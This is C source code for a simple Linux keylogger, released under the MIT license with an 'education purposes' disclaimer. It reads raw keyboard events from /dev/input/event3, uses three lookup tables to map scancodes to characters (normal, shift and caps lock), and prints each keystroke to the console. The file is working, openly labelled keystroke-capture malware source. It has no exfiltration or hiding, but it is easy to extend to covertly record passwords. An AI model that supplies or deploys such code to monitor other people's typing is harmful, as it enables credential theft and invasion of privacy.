/*
* Linux Keylogger
*
* @author: samvhb
* @description: This is a Linux keylogger written in C.
* @disclaimer: This program is meant for education purposes. I'm not responsible for any damage made by this program.
* @license: MIT
*/

#include <linux/input.h>
#include <fcntl.h>
#include <stdio.h>

#define UK "[Unknown]"

static char *scancode_to_ascii[] = {
	UK, "[Esc]",
	"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
	"[Backspace]", "[Tab]",
	"q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
	"[", "]", "[Enter]", "[LCtrl]",
	"a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
	"'", "`", "[LShift]",
	"\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
	"[RShift]",
	"[NL*]",
	"[LAlt]", " ", "[CapsLock]",
	"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
	"[NumLock]", "[ScrollLock]",
	"[NL7]", "[NL8]", "[NL9]",
	"[NL-]",
	"[NL4]", "[NL5]", "[NL6]",
	"[NL+]",
	"[NL1]", "[NL2]", "[NL3]", "[NL0]",
   	"[NL.]",
  	UK, UK, UK,
   	"[F11]", "[F12]",
  	UK, UK, UK, UK, UK, UK, UK,
   	"[NLEnter]", "[RCtrl]", "[NL/]", "[SysRq]", "[RAlt]", UK,
   	"[Home]", "[Up]", "[PageUp]", "[Left]", "[Right]", "[End]", "[Down]",
   	"[PageDown]", "[Insert]", "[Delete]"
};

static char *shift_scancode_to_ascii[] = {
   	UK, "[Esc]",
  	"!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
   	"[Backspace]", "[Tab]",
   	"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
   	"{", "}", "[Enter]", "[LCtrl]",
   	"A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
   	"\"", "~", "[LShift]",
   	"|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
   	"[RShift]",
   	"[NL*]",
   	"[LAlt]", " ", "[CapsLock]",
   	"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
   	"[NumLock]", "[ScrollLock]",
   	"[NL7]", "[NL8]", "[NL9]",
   	"[NL-]",
   	"[NL4]", "[NL5]", "[NL6]",
   	"[NL+]",
   	"[NL1]", "[NL2]", "[NL3]", "[NL0]",
   	"[NL.]",
   	UK, UK, UK,
   	"[F11]", "[F12]",
   	UK, UK, UK, UK, UK, UK, UK,
   	"[NLEnter]", "[RCtrl]", "[NL/]", "[SysRq]", "[RAlt]", UK,
   	"[Home]", "[Up]", "[PageUp]", "[Left]", "[Right]", "[End]", "[Down]",
   	"[PageDown]", "[Insert]", "[Delete]"
};

static char *caps_scancode_to_ascii[] = {
        UK, "[Esc]",
        "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
        "[Backspace]", "[Tab]",
        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
        "[", "]", "[Enter]", "[LCtrl]",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", ";",
        "'", "`", "[LShift]",
        "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/",
        "[RShift]",
        "[NL*]",
        "[LAlt]", " ", "[CapsLock]",
        "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
        "[NumLock]", "[ScrollLock]",
        "[NL7]", "[NL8]", "[NL9]",
        "[NL-]",
        "[NL4]", "[NL5]", "[NL6]",
        "[NL+]",
        "[NL1]", "[NL2]", "[NL3]", "[NL0]",
        "[NL.]",
        UK, UK, UK,
        "[F11]", "[F12]",
        UK, UK, UK, UK, UK, UK, UK,
        "[NLEnter]", "[RCtrl]", "[NL/]", "[SysRq]", "[RAlt]", UK,
        "[Home]", "[Up]", "[PageUp]", "[Left]", "[Right]", "[End]", "[Down]",
        "[PageDown]", "[Insert]", "[Delete]"
};

int main()
{
	int shift_pressed = 0;
	int caps_pressed = 0;

    	int fd;
    	fd = open("/dev/input/event3", O_RDONLY); // Change the device to your keyboard device
    	struct input_event ev;

    	while (1)
    	{
    		read(fd, &ev, sizeof(struct input_event));

		if(ev.type == 1)
		{
			if (ev.value == 1) // Pressed a key
			{
				if(ev.code == 58) // Capslock = 58
				{
					if(caps_pressed)
					{
						caps_pressed = 0;
					}
					else
					{
						caps_pressed = 1;
					}
				}

				if(ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
				{
					shift_pressed = 1;
				}

				if (shift_pressed)
				{
					printf("Key %s pressed. ", shift_scancode_to_ascii[ev.code]);
				}
				else if(caps_pressed)
				{
					printf("Key %s pressed. ", caps_scancode_to_ascii[ev.code]);
				}
				else
				{
					printf("Key %s pressed. ", scancode_to_ascii[ev.code]);
				}
			}

			if(ev.value == 0) // Released a key
                        {
                                if(ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
                                {
                                        shift_pressed = 0;
                                }
				printf("\n");
                        }
    		}
	}
}
